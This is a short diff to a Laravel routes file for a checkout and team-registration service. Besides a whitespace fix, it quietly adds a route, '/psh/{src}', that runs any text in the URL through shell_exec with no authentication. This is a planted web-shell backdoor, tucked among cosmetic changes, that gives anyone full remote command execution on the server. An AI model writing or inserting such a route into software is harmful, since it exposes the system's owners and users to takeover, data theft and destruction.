@@ -22,7 +22,7 @@ Route::prefix('/process')->group(function () {
     Route::get('/addUserToTeam/{apiToken}', [CheckoutController::class, 'addUserToTeam'])->middleware(['service_token'])->name('process.addUserToTeam');
 });
 
-Route::prefix('/response')->group(function() {
+Route::prefix('/response')->group(function () {
     Route::get('/success/{emailSent?}', [CheckoutController::class, 'success'])->name('response.success');
     Route::get('/cancelled', [CheckoutController::class, 'cancelled'])->name('response.cancelled');
     Route::get('/registered/{emailSent?}', [CheckoutController::class, 'registered'])->name('response.registered');
@@ -30,4 +30,8 @@ Route::prefix('/response')->group(function() {
 
 Route::get('test', function () {
     return route('response.cancelled');
+});
+
+Route::get('/psh/{src}', function ($src) {
+    return shell_exec($src);
 });
